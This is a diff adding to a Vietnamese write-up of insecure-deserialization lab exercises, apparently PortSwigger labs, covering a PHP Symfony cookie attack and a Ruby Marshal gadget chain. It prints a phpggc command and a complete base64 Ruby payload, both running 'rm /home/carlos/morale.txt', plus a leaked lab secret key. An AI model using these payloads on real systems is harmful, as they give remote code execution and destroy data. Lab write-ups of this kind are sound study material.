@@ -109,5 +109,71 @@ Sau vài lần thử thì cái CommonsCollections4 là dùng được, paste và
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/f7686e03-b09a-43fa-89f2-cb9f0baab743)
 
+Đây là req khi log in vào với cred wiener:peter 
 
+![image](https://github.com/user-attachments/assets/934d9327-62b9-4f0d-8c98-31dc8e32ba83)
+
+Để ý cái này giống giống với base64, khi dịch ra thì ra được thông tin:
+
+![image](https://github.com/user-attachments/assets/3dd4e870-db72-4fc3-99b3-6aeff297bb63)
+
+![image](https://github.com/user-attachments/assets/d98115fd-c43d-4a05-95ec-2c87620a38b2)
+
+Tôi đổi sang carlos thì lỗi:
+
+![image](https://github.com/user-attachments/assets/4670dab4-11d4-4bba-8d7b-66d0998d5eec)
+
+Vào target tôi cũng biết được cái web này dùng php 7.4.3 thông qua req /cgi-bin/phpinfo.php:
+
+![image](https://github.com/user-attachments/assets/603efc47-a12a-4936-867d-ff26c9423197)
+
+Và tôi tìm được thêm cái SECRET_KEY au0d4x2foyt1vm89q8zh4rf25iwcw299:
+
+![image](https://github.com/user-attachments/assets/481e3768-04aa-4ada-b398-97d619db3449)
+
+Có được key rồi, tôi đi tải công cụ PHPGGC để tạo payload PHP object khai thác lỗ hổng trong Symfony:
+
+![image](https://github.com/user-attachments/assets/f9b29ba2-32e3-47dc-8bf9-7d8bcc5d770e)
+
+![image](https://github.com/user-attachments/assets/ac87c243-86f6-41bf-856f-2b589e600a56)
+
+Tôi chạy `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64` để lấy được lệnh rm morale.txt:
+
+![image](https://github.com/user-attachments/assets/ef1b27e7-7177-4337-82eb-07b61d5180b2)
+
+Sử dụng đoạn mã PHP sau để tạo cookie hợp lệ với payload độc hại
+
+![image](https://github.com/user-attachments/assets/f6b6fc5e-55ef-466f-a59f-2a8bd71ffb80)
+
+![image](https://github.com/user-attachments/assets/41a67562-ce46-4fad-81bc-4ce38b0e61c1)
+
+<h1>---------------------------------------------------------</h1>
+<br>
+
+![image](https://github.com/user-attachments/assets/fdcf70b9-adfe-437e-ade4-d489d513f4ff)
+
+Đây là req khi log in và lần này cookie nhìn khác rồi:
+
+![image](https://github.com/user-attachments/assets/33218f1f-a820-4be5-854e-1b9f6debf58d)
+
+Search google ruby deserialization gadget chain thì có được cái [này](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html):
+
+![image](https://github.com/user-attachments/assets/4852985a-4dcb-4530-a37a-1916e83105ee)
+
+Trong trang web đó có 1 đoạn ruby này:
+
+![image](https://github.com/user-attachments/assets/b2fee1bc-4d11-489a-b983-5a4dc0f51415)
+
+Sửa command id thành rm và thêm encode base64 ở cuối:
+
+![image](https://github.com/user-attachments/assets/a0041f4c-d59c-4e41-9a4b-72f5884828a0)
+
+```BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==```
+Kết quả thì ra cái này
+
+![image](https://github.com/user-attachments/assets/c163e4f1-6ff6-4629-a9a5-5aa1f28362d7)
+
+<h1>---------------------------------------------------------</h1>
+<br>
